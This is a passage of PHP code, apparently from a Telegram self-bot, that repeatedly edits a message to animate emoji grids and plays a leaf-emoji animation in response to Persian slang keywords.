🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟪🟪🟪🟧🟧🟧
🟧🟧🟧🟪🟧🟪🟧🟧🟧
🟧🟧🟧🟪🟪🟪🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟪🟪🟪🟪🟪🟧🟧
🟧🟧🟪🟧🟧🟧🟪🟧🟧
🟧🟧🟪🟧🟦🟧🟪🟧🟧
🟧🟧🟪🟧🟧🟧🟪🟧🟧
🟧🟧🟪🟪🟪🟪🟪🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟪🟪🟪🟪🟪🟪🟪🟧
🟧🟪🟧🟧🟧🟧🟧🟪🟧
🟧🟪🟧🟦🟦🟦🟧🟪🟧
🟧🟪🟧🟦🟧🟦🟧🟪🟧
🟧🟪🟧🟦🟦🟦🟧🟪🟧
🟧🟪🟧🟧🟧🟧🟧🟪🟧
🟧🟪🟪🟪🟪🟪🟪🟪🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟪🟪🟪🟪🟪🟪🟪🟪🟪
🟪🟧🟧🟧🟧🟧🟧🟧🟪
🟪🟧🟦🟦🟦🟦🟦🟧🟪
🟪🟧🟦🟧🟧🟧🟦🟧🟪
🟪🟧🟦🟧⬜️🟧🟦🟧🟪
🟪🟧🟦🟧🟧🟧🟦🟧🟪
🟪🟧🟦🟦🟦🟦🟦🟧🟪
🟪🟧🟧🟧🟧🟧🟧🟧🟪
🟪🟪🟪🟪🟪🟪🟪🟪🟪']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟦🟦🟦🟦🟦🟦🟦🟧
🟧🟦🟧🟧🟧🟧🟧🟦🟧
🟧🟦🟧⬜️⬜️⬜️🟧🟦🟧
🟧🟦🟧⬜️⬜️⬜️🟧🟦🟧
🟧🟦🟧⬜️⬜️⬜️🟧🟦🟧
🟧🟦🟧🟧🟧🟧🟧🟦🟧
🟧🟦🟦🟦🟦🟦🟦🟦🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟦🟦🟦🟦🟦🟦🟦🟦🟦
🟦🟧🟧🟧🟧🟧🟧🟧🟦
🟦🟧⬜️⬜️⬜️⬜️⬜️🟧🟦
🟦🟧⬜️⬜️⬜️⬜️⬜️🟧🟦
🟦🟧⬜️⬜️⬜️⬜️⬜️🟧🟦
🟦🟧⬜️⬜️⬜️⬜️⬜️🟧🟦
🟦🟧⬜️⬜️⬜️⬜️⬜️🟧🟦
🟦🟧🟧🟧🟧🟧🟧🟧🟦
🟦🟦🟦🟦🟦🟦🟦🟦🟦']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧⬜️⬜️⬜️⬜️⬜️⬜️⬜️🟧
🟧⬜️⬜️⬜️⬜️⬜️⬜️⬜️🟧
🟧⬜️⬜️⬜️⬜️⬜️⬜️⬜️🟧
🟧⬜️⬜️⬜️⬜️⬜️⬜️⬜️🟧
🟧⬜️⬜️⬜️⬜️⬜️⬜️⬜️🟧
🟧⬜️⬜️⬜️⬜️⬜️⬜️⬜️🟧
🟧⬜️⬜️⬜️⬜️⬜️⬜️⬜️🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥⬜⬜⬜⬜⬜⬜⬜⬜️🟥
🟥⬜⬜⬜⬜⬜⬜⬜⬜🟥
🟥⬜⬜⬜⬜⬜⬜⬜⬜🟥
🟥⬜⬜⬜⬜⬜⬜⬜⬜🟥
🟥⬜⬜⬜⬜⬜⬜⬜⬜🟥
🟥⬜⬜⬜⬜⬜⬜⬜⬜🟥
🟥⬜⬜⬜⬜⬜⬜⬜⬜🟥
🟥⬜⬜⬜⬜⬜⬜⬜⬜🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜⬜⬜⬜⬜⬜🟥🟥
🟥🟥⬜⬜⬜⬜⬜⬜🟥🟥
🟥🟥⬜⬜⬜⬜⬜⬜🟥🟥
🟥🟥⬜⬜⬜⬜⬜⬜🟥🟥
🟥🟥⬜⬜⬜⬜⬜⬜🟥🟥
🟥🟥⬜⬜⬜⬜⬜⬜🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥⬜⬜⬜⬜️🟥🟥🟥
🟥🟥🟥⬜⬜⬜⬜🟥🟥🟥
🟥🟥🟥⬜⬜⬜⬜🟥🟥🟥
🟥🟥🟥⬜⬜⬜⬜🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥⬜️⬜️🟥🟥🟥🟥
🟥🟥🟥🟥⬜⬜️🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥??🟥
🟥??🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥💙💙🟥🟥🟥🟥
🟥🟥🟥🟥💙💙🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟦🟦🟥🟥🟥🟥
🟥🟥🟥🟥🟦🟦🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟦🟦🟦🟦🟥🟥🟥
🟥🟥🟥🟦🟦🟦🟦🟥🟥🟥
🟥🟥🟥🟦🟦🟦🟦🟥🟥🟥
🟥🟥🟥🟦🟦🟦🟦🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟨🟨🟨🟨🟨🟨🟥🟥
🟥🟥🟨🟦🟦🟦🟦🟨🟥🟥
🟥🟥🟨🟦🟦🟦🟦🟨🟥🟥
🟥🟥🟨🟦🟦🟦🟦🟨🟥🟥
🟥🟥🟨🟦🟦🟦🟦🟨🟥🟥
🟥🟥🟨🟨🟨🟨🟨🟨🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟨🟨🟨🟨🟨🟨🟨🟨🟥
🟥🟨🟨🟨🟨🟨🟨🟨🟨🟥
🟥🟨🟨🟦🟦🟦🟦🟨🟨🟥
🟥🟨🟨🟦🟦🟦🟦🟨🟨🟥
🟥🟨🟨🟦🟦🟦🟦🟨🟨🟥
🟥🟨🟨🟦🟦🟦🟦🟨🟨🟥
🟥🟨🟨🟨🟨🟨🟨🟨🟨🟥
🟥🟨🟨🟨🟨🟨🟨🟨🟨🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟪🟨🟨🟨🟨🟨🟨🟪🟥
🟥🟨🟪🟨🟨🟨🟨🟪🟨🟥
🟥🟨🟨🟦🟦🟦🟦🟨🟨🟥
🟥🟨🟨🟦🟦🟦🟦🟨🟨🟥
🟥🟨🟨🟦🟦🟦🟦🟨🟨🟥
🟥🟨🟨🟦🟦🟦🟦🟨🟨🟥
🟥🟨🟪🟨🟨🟨🟨🟪🟨🟥
🟥🟪🟨🟨🟨🟨🟨🟨🟪🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟪🟨🟨🟨🟨🟨🟨🟪🟥
🟥🟪🟪🟨🟨🟨🟨🟪🟪🟥
🟥🟪🟨🟦🟦🟦🟦🟨🟪🟥
🟥🟪🟨🟦🟦🟦🟦🟨🟪🟥
🟥🟪🟨🟦🟦🟦🟦🟨🟪🟥
🟥🟪🟨🟦🟦🟦🟦🟨🟪🟥
🟥🟪🟪🟨🟨🟨🟨🟪🟪🟥
🟥🟪🟨🟨🟨🟨🟨🟨🟪🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟪🟩🟩🟩🟩🟩🟩🟪🟥
🟥🟪🟪🟨🟨🟨🟨🟪🟪🟥
🟥🟪🟨🟦🟦🟦🟦🟨🟪🟥
🟥🟪🟨🟦🟦🟦🟦🟨🟪🟥
🟥🟪🟨🟦🟦🟦🟦🟨🟪🟥
🟥🟪🟨🟦🟦🟦🟦🟨🟪🟥
🟥🟪🟪🟨🟨🟨🟨🟪🟪🟥
🟥🟪🟩🟩🟩🟩🟩🟩🟪🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟪🟩🟩🟩🟩🟩🟩🟪🟥
🟥🟪🟪⬛️⬛️⬛️⬛️🟪🟪🟥
🟥🟪🟧🟦🟦🟦🟦🟧🟪🟥
🟥🟪🟧🟦🟦🟦🟦🟧🟪🟥
🟥🟪🟧🟦🟦🟦🟦🟧🟪🟥
🟥🟪🟧🟦🟦🟦🟦🟧🟪🟥
🟥🟪🟪⬛️⬛️⬛️⬛️🟪🟪🟥
🟥🟪🟩🟩🟩🟩🟩🟩🟪🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟪🟩🟩🟩🟩🟩🟩🟪🟥
🟥🟪🟪⬛️⬛️⬛️⬛️🟪🟪🟥
🟥🟪🟧🟨🟦🟦🟨🟧🟪🟥
🟥🟪🟧🟦🟨🟨🟦🟧🟪🟥
🟥🟪🟧🟦🟨🟨🟦🟧🟪🟥
🟥🟪🟧🟨🟦🟦🟨🟧🟪🟥
🟥🟪🟪⬛️⬛️⬛️⬛️🟪🟪🟥
🟥🟪🟩🟩🟩🟩🟩🟩🟪🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥??🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟪🟩🟩🟩🟩🟩🟩🟪🟥
🟥🟪🟪⬛️⬛️⬛️⬛️🟪🟪🟥
🟥🟪🟧💛🟦🟦💛🟧🟪🟥
🟥🟪🟧🟦💛💛🟦🟧🟪🟥
🟥🟪🟧🟦💛💛🟦🟧🟪🟥
🟥🟪🟧💛🟦🟦💛🟧🟪🟥
🟥🟪🟪⬛️⬛️⬛️⬛️🟪🟪🟥
🟥🟪🟩🟩🟩🟩🟩🟩🟪🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟪🟩🟩🟩🟩🟩🟩🟪🟥
🟥🟪🟪⬛️⬛️⬛️⬛️🟪🟪🟥
🟥🟪🟧💛💙💙💛🟧🟪🟥
🟥🟪🟧💙💛💛💙🟧🟪🟥
🟥🟪🟧💙💛💛💙🟧🟪🟥
🟥🟪🟧💛💙💙💛🟧🟪🟥
🟥🟪🟪⬛️⬛️⬛️⬛️🟪🟪🟥
🟥🟪🟩🟩🟩🟩🟩🟩🟪🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟪🟩🟩🟩🟩🟩🟩🟪🟥
🟥🟪🟪🖤🖤🖤🖤🟪🟪🟥
🟥🟪🟧💛💙💙💛🟧🟪🟥
🟥🟪🟧💙💛💛💙🟧??🟥
🟥??🟧💙💛💛💙🟧🟪🟥
🟥🟪🟧💛💙💙💛🟧🟪🟥
🟥🟪🟪🖤🖤🖤🖤🟪🟪🟥
🟥🟪🟩🟩🟩🟩🟩🟩🟪🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥💜🟩🟩🟩🟩🟩🟩💜🟥
🟥💜💜🖤🖤🖤🖤💜💜🟥
🟥💜🟧💛💙💙💛🟧💜🟥
🟥💜🟧💙💛💛💙🟧💜🟥
🟥💜🟧💙💛💛💙🟧💜🟥
🟥💜🟧💛💙💙💛🟧💜🟥
🟥💜💜🖤🖤🖤🖤💜💜🟥
🟥💜🟩🟩🟩🟩🟩🟩💜🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥💜🟩🟩🟩🟩🟩🟩💜🟥
🟥💜💜🖤🖤🖤🖤💜💜🟥
🟥💜🧡💛💙💙💛🧡💜🟥
🟥💜🧡💙💛💛💙🧡💜🟥
🟥💜🧡💙💛💛💙🧡💜🟥
🟥💜🧡💛💙💙💛🧡💜🟥
🟥💜💜🖤🖤🖤🖤💜💜🟥
🟥💜🟩🟩🟩🟩🟩🟩💜🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥💜💚💚💚💚💚💚💜🟥
🟥💜💜🖤🖤🖤🖤💜💜🟥
🟥💜🧡💛💙💙💛🧡💜🟥
🟥💜🧡💙💛💛💙🧡💜🟥
🟥💜🧡💙💛💛💙🧡💜🟥
🟥💜🧡💛💙💙💛🧡💜🟥
🟥💜💜🖤🖤🖤🖤💜💜🟥
🟥💜💚💚💚💚💚💚💜🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️💜💚💚💚💚💚💚💜❤️
❤️💜💜🖤🖤🖤🖤💜💜❤️
❤️💜🧡💛💙💙💛🧡💜❤️
❤️💜🧡💙💛💛💙🧡💜❤️
❤️💜🧡💙💛💛??🧡💜❤️
❤️💜🧡💛💙💙💛🧡💜❤️
❤️💜💜🖤🖤🖤🖤💜💜❤️
❤️💜💚💚💚💚💚💚💜❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️◻️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⬜️⬜️⬜️⬜️⬜️⬜️⬜️◻️◽️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️◻️◻️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⬜️⬜️⬜️⬜️⬜️⬜️◻️◽️▫️
⬜️⬜️⬜️⬜️⬜️⬜️◻️◽️◽️
⬜️⬜️⬜️⬜️⬜️⬜️◻️◻️◻️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⬜️⬜️⬜️⬜️⬜️◻️◽️▫️▫️
⬜️⬜️⬜️⬜️⬜️◻️◽️▫️▫️
⬜️⬜️⬜️⬜️⬜️◻️◽️◽️◽️
⬜️⬜️⬜️⬜️⬜️◻️◻️◻️◻️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⬜️⬜️⬜️⬜️◻️◽️▫️▫️▫️
⬜️⬜️⬜️⬜️◻️◽️▫️▫️▫️
⬜️⬜️⬜️⬜️◻️◽️▫️▫️▫️
⬜️⬜️⬜️⬜️◻️◽️◽️◽️◽️
⬜️⬜️⬜️⬜️◻️◻️◻️◻️◻️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⬜️⬜️⬜️◻️◽️▫️▫️▫️▫️
⬜️⬜️⬜️◻️◽️▫️▫️▫️▫️
⬜️⬜️⬜️◻️◽️▫️▫️▫️▫️
⬜️⬜️⬜️◻️◽️▫️▫️▫️▫️
⬜️⬜️⬜️◻️◽️◽️◽️◽️◽️
⬜️⬜️⬜️◻️◻️◻️◻️◻️◻️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⬜️⬜️◻️◽️▫️▫️▫️▫️▫️
⬜️⬜️◻️◽️▫️▫️▫️▫️▫️
⬜️⬜️◻️◽️▫️▫️▫️▫️▫️
⬜️⬜️◻️◽️▫️▫️▫️▫️▫️
⬜️⬜️◻️◽️▫️▫️▫️▫️▫️
⬜️⬜️◻️◽️◽️◽️◽️◽️◽️
⬜️⬜️◻️◻️◻️◻️◻️◻️◻️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⬜️◻️◽️▫️▫️▫️▫️▫️▫️
⬜️◻️◽️▫️▫️▫️▫️▫️▫️
⬜️◻️◽️▫️▫️▫️▫️▫️▫️
⬜️◻️◽️▫️▫️▫️▫️▫️▫️
⬜️◻️◽️▫️▫️▫️▫️▫️▫️
⬜️◻️◽️▫️▫️▫️▫️▫️▫️
⬜️◻️◽️◽️◽️◽️◽️◽️◽️
⬜️◻️◻️◻️◻️◻️◻️◻️◽️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '◻️◽️▫️▫️▫️▫️▫️▫️▫️
◻️◽️▫️▫️▫️▫️▫️▫️▫️
◻️◽️▫️▫️▫️▫️▫️▫️▫️
◻️◽️▫️▫️▫️▫️▫️▫️▫️
◻️◽️▫️▫️▫️▫️▫️▫️▫️
◻️◽️▫️▫️▫️▫️▫️▫️▫️
◻️◽️▫️▫️▫️▫️▫️▫️▫️
◻️◽️◽️◽️◽️◽️◽️◽️◽️
◻️◻️◻️◻️◻️◻️◻️◻️◻️']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '◽️▫️▫️▫️▫️▫️▫️▫️▫️
◽️▫️▫️▫️▫️▫️▫️▫️▫️
◽️▫️▫️▫️▫️▫️▫️▫️▫️
◽️▫️▫️▫️▫️▫️▫️▫️▫️
◽️▫️▫️▫️▫️▫️▫️▫️▫️
◽️▫️▫️▫️▫️▫️▫️▫️▫️
◽️▫️▫️▫️▫️▫️▫️▫️▫️
◽️▫️▫️▫️▫️▫️▫️▫️▫️
◽️◽️◽️◽️◽️◽️◽️◽️◽']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '▫️▫️▫️▫️▫️▫️▫️▫️▫️
▫️▫️▫️▫️▫️▫️▫️▫️▫️
▫️▫️▫️▫️▫️▫️▫️▫️▫️
▫️▫️▫️▫️▫️▫️▫️▫️▫️
▫️▫️▫️▫️▫️▫️▫️▫️▫️
▫️▫️▫️▫️▫️▫️▫️▫️▫️
▫️▫️▫️▫️▫️▫️▫️▫️▫️
▫️▫️▫️▫️▫️▫️▫️▫️▫️
▫️▫️▫️▫️▫️▫️▫️▫️▫️']);
                    }

                    if ($text == 'پشم' or $text == 'پشمام') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🍂🍂🍂🍂🍂🍂🍂🍂🍂🍂🍂🍂🍂🍂🍂']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🍁🍁🍁🍁🍁🍁🍁🍁🍁🍁🍁🍁🍁🍁🍁']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🍃🍃🍃🍃🍃🍃🍃🍃🍃🍃🍃🍃🍃🍃🍃']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '☘️☘️☘️☘️☘️☘️☘️☘️☘️☘️☘️☘️☘️☘️☘️']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🍀🍀🍀🍀🍀🍀🍀🍀🍀🍀🍀🍀🍀🍀🍀️']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'پشم دیگه ندارم ولی برگام ریخت بمولا']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🍂🍁🍂🍁🍂🍁🍂🍁🍂🍁🍂🍁🍂🍁🍂']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌱🌿🌱🌿🌱🌿🌱🌿🌱🌿🌱🌿🌱🌿🌱']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🍂🍂🌿🍂🌿🍂🌿🍂🌿🍂🌿🍂🌿🍂🌿']);
